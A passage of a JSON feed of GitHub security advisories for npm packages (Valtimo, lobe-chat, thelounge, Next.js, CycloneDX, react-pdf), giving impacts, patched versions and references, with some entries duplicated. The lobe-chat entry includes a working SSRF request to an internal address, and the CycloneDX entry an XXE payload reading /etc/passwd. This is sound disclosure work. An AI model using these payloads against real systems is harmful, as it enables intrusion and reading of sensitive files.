            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>When opening a form in Valtimo, the access token (JWT) of the user is exposed to <code>api.form.io</code> via the the <code>x-jwt-token</code> header. An attacker can retrieve personal information from this token, or use it to execute requests to the Valtimo REST API on behalf of the logged-in user.</p>\n<p>This issue is caused by a misconfiguration of the Form.io component.</p>\n<h3 id=\"attack-requirements\">Attack requirements</h3>\n<p>The following conditions have to be met in order to perform this attack:</p>\n<ul>\n<li>An attacker needs to have access to the network traffic on the <code>api.form.io</code> domain.</li>\n<li>The content of the <code>x-jwt-token</code> header is logged or otherwise available to the attacker.</li>\n<li>An attacker needs to have network access to the Valtimo API.</li>\n<li>An attacker needs to act within the time-to-live of the access token. The default TTL in Keycloak is 5 minutes.</li>\n</ul>\n<h3 id=\"patches\">Patches</h3>\n<p>Versions 10.8.4, 11.1.6 and 11.2.2 have been patched</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/valtimo-platform/valtimo-frontend-libraries/security/advisories/GHSA-xcp4-62vj-cq3r\">https://github.com/valtimo-platform/valtimo-frontend-libraries/security/advisories/GHSA-xcp4-62vj-cq3r</a></li>\n<li><a href=\"https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/1aaba5ef5750dafebbc7476fb08bf2375a25f19e\">https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/1aaba5ef5750dafebbc7476fb08bf2375a25f19e</a></li>\n<li><a href=\"https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/8c2dbf2a41180d2b0358d878290e4d37168f0fb6\">https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/8c2dbf2a41180d2b0358d878290e4d37168f0fb6</a></li>\n<li><a href=\"https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/d65e05fd2784bd4a628778b34a5b79ce2f0cef8c\">https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/d65e05fd2784bd4a628778b34a5b79ce2f0cef8c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34706\">https://nvd.nist.gov/vuln/detail/CVE-2024-34706</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xcp4-62vj-cq3r\">https://github.com/advisories/GHSA-xcp4-62vj-cq3r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xcp4-62vj-cq3r",
            "title": "[@valtimo/components] @valtimo/components exposes access token to form.io",
            "date_modified": "2024-05-14T20:04:06.000Z",
            "date_published": "2024-05-13T16:04:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xcp4-62vj-cq3r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>When opening a form in Valtimo, the access token (JWT) of the user is exposed to <code>api.form.io</code> via the the <code>x-jwt-token</code> header. An attacker can retrieve personal information from this token, or use it to execute requests to the Valtimo REST API on behalf of the logged-in user.</p>\n<p>This issue is caused by a misconfiguration of the Form.io component.</p>\n<h3 id=\"attack-requirements\">Attack requirements</h3>\n<p>The following conditions have to be met in order to perform this attack:</p>\n<ul>\n<li>An attacker needs to have access to the network traffic on the <code>api.form.io</code> domain.</li>\n<li>The content of the <code>x-jwt-token</code> header is logged or otherwise available to the attacker.</li>\n<li>An attacker needs to have network access to the Valtimo API.</li>\n<li>An attacker needs to act within the time-to-live of the access token. The default TTL in Keycloak is 5 minutes.</li>\n</ul>\n<h3 id=\"patches\">Patches</h3>\n<p>Versions 10.8.4, 11.1.6 and 11.2.2 have been patched</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/valtimo-platform/valtimo-frontend-libraries/security/advisories/GHSA-xcp4-62vj-cq3r\">https://github.com/valtimo-platform/valtimo-frontend-libraries/security/advisories/GHSA-xcp4-62vj-cq3r</a></li>\n<li><a href=\"https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/1aaba5ef5750dafebbc7476fb08bf2375a25f19e\">https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/1aaba5ef5750dafebbc7476fb08bf2375a25f19e</a></li>\n<li><a href=\"https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/8c2dbf2a41180d2b0358d878290e4d37168f0fb6\">https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/8c2dbf2a41180d2b0358d878290e4d37168f0fb6</a></li>\n<li><a href=\"https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/d65e05fd2784bd4a628778b34a5b79ce2f0cef8c\">https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/d65e05fd2784bd4a628778b34a5b79ce2f0cef8c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34706\">https://nvd.nist.gov/vuln/detail/CVE-2024-34706</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xcp4-62vj-cq3r\">https://github.com/advisories/GHSA-xcp4-62vj-cq3r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xcp4-62vj-cq3r",
            "title": "[@valtimo/components] @valtimo/components exposes access token to form.io",
            "date_modified": "2024-05-14T20:04:06.000Z",
            "date_published": "2024-05-13T16:04:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xcp4-62vj-cq3r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The latest version of lobe-chat(by now v0.141.2) has an unauthorized ssrf vulnerability. An attacker can construct malicious requests to cause SSRF without logging in, attack intranet services, and leak sensitive information.</p>\n<h3 id=\"details\">Details</h3>\n<ul>\n<li>visit <a href=\"https://chat-preview.lobehub.com/settings/agent\">https://chat-preview.lobehub.com/settings/agent</a>  </li>\n<li>you can attack all internal services by /api/proxy and get the echo in http response :)</li>\n</ul>\n<p><img alt=\"image\" src=\"https://github.com/lobehub/lobe-chat/assets/55245002/c2894c34-7333-4ae1-864c-3b212b95eb21\"></p>\n<p><img alt=\"image\" src=\"https://github.com/lobehub/lobe-chat/assets/55245002/dd9ad696-7180-4700-8bff-1171a6a8ac91\"></p>\n<p><img alt=\"image\" src=\"https://github.com/lobehub/lobe-chat/assets/55245002/e2b97520-a6d5-4939-8313-46db8a1c4b75\"></p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-http\">POST /api/proxy HTTP/2\nHost: xxxxxxxxxxxxxxxxx\nCookie: LOBE_LOCALE=zh-CN; LOBE_THEME_PRIMARY_COLOR=undefined; LOBE_THEME_NEUTRAL_COLOR=undefined; _ga=GA1.1.86608329.1711346216; _ga_63LP1TV70T=GS1.1.1711346215.1.1.1711346846.0.0.0\nContent-Length: 23\nSec-Ch-Ua: \"Google Chrome\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"\nSec-Ch-Ua-Platform: \"Windows\"\nSec-Ch-Ua-Mobile: ?0\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36\nContent-Type: text/plain;charset=UTF-8\nAccept: */*\nOrigin: https://chat-preview.lobehub.com\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://chat-preview.lobehub.com/settings/agent\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7\n\nhttp://172.23.0.1:8000/\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>SSRF ,All users will be impacted.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/lobehub/lobe-chat/security/advisories/GHSA-mxhq-xw3g-rphc\">https://github.com/lobehub/lobe-chat/security/advisories/GHSA-mxhq-xw3g-rphc</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32964\">https://nvd.nist.gov/vuln/detail/CVE-2024-32964</a></li>\n<li><a href=\"https://github.com/lobehub/lobe-chat/commit/465665a735556669ee30446c7ea9049a20cc7c37\">https://github.com/lobehub/lobe-chat/commit/465665a735556669ee30446c7ea9049a20cc7c37</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mxhq-xw3g-rphc\">https://github.com/advisories/GHSA-mxhq-xw3g-rphc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mxhq-xw3g-rphc",
            "title": "[@lobehub/chat] lobe-chat `/api/proxy` endpoint Server-Side Request Forgery vulnerability",
            "date_modified": "2024-05-14T20:03:55.000Z",
            "date_published": "2024-05-10T15:29:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mxhq-xw3g-rphc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Per RFC 1413, The unique identifying tuple includes not only the ports, but also the both addresses. Without the addresses, the information becomes both non-unique and public:</p>\n<ul>\n<li>If multiple connections happen to use the same local port number (which is possible if the addresses differ), the username of the first is returned for all, resulting in the wrong ident for all but the first.</li>\n<li>By not checking the connection address, the information becomes public. Because there is only a relatively small number of local ports, and the remote ports are likely to be either 6667 or 6697, it becomes trivial to scan the entire range to get a list of idents.</li>\n</ul>\n<p>To prevent this from happening, disable identd or upgrade to a non vulnerable version.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/thelounge/thelounge/security/advisories/GHSA-g49q-jw42-6x85\">https://github.com/thelounge/thelounge/security/advisories/GHSA-g49q-jw42-6x85</a></li>\n<li><a href=\"https://github.com/thelounge/thelounge/pull/4872\">https://github.com/thelounge/thelounge/pull/4872</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g49q-jw42-6x85\">https://github.com/advisories/GHSA-g49q-jw42-6x85</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g49q-jw42-6x85",
            "title": "[thelounge] thelounge may publicly disclose of all usernames/idents via port 113",
            "date_modified": "2024-05-09T21:31:38.000Z",
            "date_published": "2024-05-09T21:31:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g49q-jw42-6x85"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A Server-Side Request Forgery (SSRF) vulnerability was identified in Next.js Server Actions by security researchers at Assetnote. If the <code>Host</code> header is modified, and the below conditions are also met, an attacker may be able to make requests that appear to be originating from the Next.js application server itself.</p>\n<h4 id=\"prerequisites\">Prerequisites</h4>\n<ul>\n<li>Next.js (<code>&lt;14.1.1</code>) is running in a self-hosted* manner.</li>\n<li>The Next.js application makes use of Server Actions.</li>\n<li>The Server Action performs a redirect to a relative path which starts with a <code>/</code>.</li>\n</ul>\n<p>* Many hosting providers (including Vercel) route requests based on the Host header, so we do not believe that this vulnerability affects any Next.js applications where routing is done in this manner.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This vulnerability was patched in <a href=\"https://github.com/vercel/next.js/pull/62561\">#62561</a> and fixed in Next.js <code>14.1.1</code>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There are no official workarounds for this vulnerability. We recommend upgrading to Next.js <code>14.1.1</code>.</p>\n<h3 id=\"credit\">Credit</h3>\n<p>Vercel and the Next.js team thank Assetnote for responsibly disclosing this issue to us, and for working with us to verify the fix. Thanks to:</p>\n<p>Adam Kues - Assetnote\nShubham Shah - Assetnote</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vercel/next.js/security/advisories/GHSA-fr5h-rqp8-mj6g\">https://github.com/vercel/next.js/security/advisories/GHSA-fr5h-rqp8-mj6g</a></li>\n<li><a href=\"https://github.com/vercel/next.js/pull/62561\">https://github.com/vercel/next.js/pull/62561</a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/8f7a6ca7d21a97bc9f7a1bbe10427b5ad74b9085\">https://github.com/vercel/next.js/commit/8f7a6ca7d21a97bc9f7a1bbe10427b5ad74b9085</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34351\">https://nvd.nist.gov/vuln/detail/CVE-2024-34351</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fr5h-rqp8-mj6g\">https://github.com/advisories/GHSA-fr5h-rqp8-mj6g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fr5h-rqp8-mj6g",
            "title": "[next] Next.js Server-Side Request Forgery in Server Actions",
            "date_modified": "2024-05-14T20:02:43.000Z",
            "date_published": "2024-05-09T21:18:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fr5h-rqp8-mj6g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Inconsistent interpretation of a crafted HTTP request meant that requests are treated as both a single request, and two separate requests by Next.js, leading to desynchronized responses. This led to a response queue poisoning vulnerability in the affected Next.js versions.</p>\n<p>For a request to be exploitable, the affected route also had to be making use of the <a href=\"https://nextjs.org/docs/app/api-reference/next-config-js/rewrites\">rewrites</a> feature in Next.js.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability is resolved in Next.js <code>13.5.1</code> and newer. This includes Next.js <code>14.x</code>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There are no official workarounds for this vulnerability. We recommend that you upgrade to a safe version.</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning\">https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vercel/next.js/security/advisories/GHSA-77r5-gw3j-2mpf\">https://github.com/vercel/next.js/security/advisories/GHSA-77r5-gw3j-2mpf</a></li>\n<li><a href=\"https://github.com/vercel/next.js/commit/44eba020c615f0d9efe431f84ada67b81576f3f5\">https://github.com/vercel/next.js/commit/44eba020c615f0d9efe431f84ada67b81576f3f5</a></li>\n<li><a href=\"https://github.com/vercel/next.js/compare/v13.5.0...v13.5.1\">https://github.com/vercel/next.js/compare/v13.5.0...v13.5.1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34350\">https://nvd.nist.gov/vuln/detail/CVE-2024-34350</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-77r5-gw3j-2mpf\">https://github.com/advisories/GHSA-77r5-gw3j-2mpf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-77r5-gw3j-2mpf",
            "title": "[next] Next.js Vulnerable to HTTP Request Smuggling",
            "date_modified": "2024-05-14T20:02:31.000Z",
            "date_published": "2024-05-09T21:07:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-77r5-gw3j-2mpf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>XML External entity injections could be possible, when running the provided XML Validator on arbitrary input.</p>\n<h4 id=\"poc\">POC</h4>\n<pre><code class=\"language-js\">const {\n  Spec: { Version },\n  Validation: { XmlValidator }\n} = require('@cyclonedx/cyclonedx-library');\n\nconst version = Version.v1dot5;\nconst validator = new XmlValidator(version);\nconst input = `&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE poc [\n  &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;\n]&gt;\n&lt;bom xmlns=\"http://cyclonedx.org/schema/bom/1.5\"&gt;\n  &lt;components&gt;\n    &lt;component type=\"library\"&gt;\n      &lt;name&gt;testing&lt;/name&gt;\n      &lt;version&gt;1.337&lt;/version&gt;\n      &lt;licenses&gt;\n        &lt;license&gt;\n          &lt;id&gt;&amp;xxe;&lt;/id&gt;&lt;!-- &lt;&lt; XML external entity (XXE) injection --&gt;\n        &lt;/license&gt;\n      &lt;/licenses&gt;\n    &lt;/component&gt;\n  &lt;/components&gt;\n&lt;/bom&gt;`;\n\n// validating this forged(^) input might lead to unintended behaviour\n// for the fact that the XML external entity would be taken into account.\nvalidator.validate(input).then(ve =&gt; {\n  console.error('validation error', ve);\n});\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>This issue was fixed in <code>@cyclonedx/cyclonedx-library@6.7.1 </code>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Do not run the provided XML validator on untrusted inputs.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>issue was introduced via <a href=\"https://github.com/CycloneDX/cyclonedx-javascript-library/pull/1063\">https://github.com/CycloneDX/cyclonedx-javascript-library/pull/1063</a>.</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/CycloneDX/cyclonedx-javascript-library/security/advisories/GHSA-38gf-rh2w-gmj7\">https://github.com/CycloneDX/cyclonedx-javascript-library/security/advisories/GHSA-38gf-rh2w-gmj7</a></li>\n<li><a href=\"https://github.com/CycloneDX/cyclonedx-javascript-library/pull/1063\">https://github.com/CycloneDX/cyclonedx-javascript-library/pull/1063</a></li>\n<li><a href=\"https://github.com/CycloneDX/cyclonedx-javascript-library/commit/5e5e1e0b9422f47d2de81c7c4064b803a01e7203\">https://github.com/CycloneDX/cyclonedx-javascript-library/commit/5e5e1e0b9422f47d2de81c7c4064b803a01e7203</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34345\">https://nvd.nist.gov/vuln/detail/CVE-2024-34345</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-38gf-rh2w-gmj7\">https://github.com/advisories/GHSA-38gf-rh2w-gmj7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-38gf-rh2w-gmj7",
            "title": "[@cyclonedx/cyclonedx-library] @cyclonedx/cyclonedx-library Improper Restriction of XML External Entity Reference vulnerability",
            "date_modified": "2024-05-14T20:01:49.000Z",
            "date_published": "2024-05-08T19:55:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-38gf-rh2w-gmj7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>If PDF.js is used to load a malicious PDF, and PDF.js is configured with <code>isEvalSupported</code> set to <code>true</code> (which is the default value), unrestricted attacker-controlled JavaScript will be executed in the context of the hosting domain.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><a href=\"https://github.com/wojtekmaj/react-pdf/commit/671e6eaa2e373e404040c13cc6b668fe39839cad\">This patch</a> forces <code>isEvalSupported</code> to <code>false</code>, removing the attack vector.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Set <code>options.isEvalSupported</code> to <code>false</code>, where <code>options</code> is <code>Document</code> component prop.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq\">GHSA-wgrm-67xf-hhpq</a></li>\n<li><a href=\"https://github.com/mozilla/pdf.js/pull/18015\">https://github.com/mozilla/pdf.js/pull/18015</a></li>\n<li><a href=\"https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6\">https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6</a></li>\n<li><a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=1893645\">https://bugzilla.mozilla.org/show_bug.cgi?id=1893645</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq\">https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq</a></li>\n<li><a href=\"https://github.com/wojtekmaj/react-pdf/security/advisories/GHSA-87hq-q4gp-9wr4\">https://github.com/wojtekmaj/react-pdf/security/advisories/GHSA-87hq-q4gp-9wr4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34342\">https://nvd.nist.gov/vuln/detail/CVE-2024-34342</a></li>\n<li><a href=\"https://github.com/mozilla/pdf.js/pull/18015\">https://github.com/mozilla/pdf.js/pull/18015</a></li>\n<li><a href=\"https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6\">https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6</a></li>\n<li><a href=\"https://github.com/wojtekmaj/react-pdf/commit/208f28dd47fe38c33ce4bac4205b2b0a0bb207fe\">https://github.com/wojtekmaj/react-pdf/commit/208f28dd47fe38c33ce4bac4205b2b0a0bb207fe</a></li>\n<li><a href=\"https://github.com/wojtekmaj/react-pdf/commit/671e6eaa2e373e404040c13cc6b668fe39839cad\">https://github.com/wojtekmaj/react-pdf/commit/671e6eaa2e373e404040c13cc6b668fe39839cad</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-87hq-q4gp-9wr4\">https://github.com/advisories/GHSA-87hq-q4gp-9wr4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-87hq-q4gp-9wr4",
            "title": "[react-pdf] react-pdf vulnerable to arbitrary JavaScript execution upon opening a malicious PDF with PDF.js",
            "date_modified": "2024-05-08T10:10:23.000Z",
            "date_published": "2024-05-07T16:48:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-87hq-q4gp-9wr4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>If PDF.js is used to load a malicious PDF, and PDF.js is configured with <code>isEvalSupported</code> set to <code>true</code> (which is the default value), unrestricted attacker-controlled JavaScript will be executed in the context of the hosting domain.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><a href=\"https://github.com/wojtekmaj/react-pdf/commit/671e6eaa2e373e404040c13cc6b668fe39839cad\">This patch</a> forces <code>isEvalSupported</code> to <code>false</code>, removing the attack vector.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Set <code>options.isEvalSupported</code> to <code>false</code>, where <code>options</code> is <code>Document</code> component prop.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq\">GHSA-wgrm-67xf-hhpq</a></li>\n<li><a href=\"https://github.com/mozilla/pdf.js/pull/18015\">https://github.com/mozilla/pdf.js/pull/18015</a></li>\n<li><a href=\"https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6\">https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6</a></li>\n<li><a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=1893645\">https://bugzilla.mozilla.org/show_bug.cgi?id=1893645</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq\">https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq</a></li>\n<li><a href=\"https://github.com/wojtekmaj/react-pdf/security/advisories/GHSA-87hq-q4gp-9wr4\">https://github.com/wojtekmaj/react-pdf/security/advisories/GHSA-87hq-q4gp-9wr4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34342\">https://nvd.nist.gov/vuln/detail/CVE-2024-34342</a></li>\n<li><a href=\"https://github.com/mozilla/pdf.js/pull/18015\">https://github.com/mozilla/pdf.js/pull/18015</a></li>\n<li><a href=\"https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6\">https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6</a></li>\n<li><a href=\"https://github.com/wojtekmaj/react-pdf/commit/208f28dd47fe38c33ce4bac4205b2b0a0bb207fe\">https://github.com/wojtekmaj/react-pdf/commit/208f28dd47fe38c33ce4bac4205b2b0a0bb207fe</a></li>\n<li><a href=\"https://github.com/wojtekmaj/react-pdf/commit/671e6eaa2e373e404040c13cc6b668fe39839cad\">https://github.com/wojtekmaj/react-pdf/commit/671e6eaa2e373e404040c13cc6b668fe39839cad</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-87hq-q4gp-9wr4\">https://github.com/advisories/GHSA-87hq-q4gp-9wr4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-87hq-q4gp-9wr4",
            "title": "[react-pdf] react-pdf vulnerable to arbitrary JavaScript execution upon opening a malicious PDF with PDF.js",
            "date_modified": "2024-05-08T10:10:23.000Z",
            "date_published": "2024-05-07T16:48:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-87hq-q4gp-9wr4"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}